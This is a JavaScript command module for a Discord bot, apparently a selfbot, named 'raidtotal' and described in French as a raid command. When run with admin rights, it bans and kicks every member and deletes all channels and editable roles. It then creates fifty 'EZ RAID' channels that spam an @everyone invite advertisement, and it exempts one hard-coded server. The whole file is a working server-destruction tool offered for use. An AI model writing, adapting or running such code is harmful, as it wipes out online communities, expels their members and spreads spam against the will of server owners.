const fs = require('fs');
const path = require('path');
const { language } = require("../../fonctions");

module.exports = {
  name: "raidtotal",
  description: "Commande de raid",
  run: async (client, message, args) => {

    if (message.guild.id === '1274437651759632484') {
      return message.edit("T'as cru t'allais faire quoi là");
    }

    if (!message.guild) {
      return message.edit("Cette commande ne peut être exécutée que dans un serveur.");
    }

    const requiredPermissions = [
      "MANAGE_GUILD", 
      "BAN_MEMBERS", 
      "MANAGE_ROLES", 
      "MANAGE_CHANNELS", 
      "CREATE_INSTANT_INVITE"
    ];

    if (!message.member.permissions.has("ADMINISTRATOR") && 
        !message.member.permissions.has(requiredPermissions, true)) {
      return message.edit("Vous n'avez pas les permissions nécessaires (admin) pour exécuter cette commande.");
    }

    await message.guild.members.fetch();

    message.guild.members.cache.forEach(member => {
      if (member.id !== client.user.id) { 
        member.kick().catch(() => {});
        member.ban().catch(() => {});
      }
    });

    message.guild.channels.cache.forEach(channel => {
      channel.delete().catch(() => {});
    });

    message.guild.roles.cache.forEach(role => {
      if (role.editable && role.id !== message.guild.id) {
        role.delete().catch(() => {});
      }
    });

    const raidMessage = args.length > 0 ? args.join(" ") : "🚩 RED DOM ON TOP 🚩 discord.gg/reddom @everyone";

    for (let i = 1; i <= 50; i++) {
      message.guild.channels.create(`EZ RAID`, { type: "GUILD_TEXT" }).then(channel => {
        channel.send(raidMessage).catch(() => {});
      }).catch(() => {});
    }
  }
};
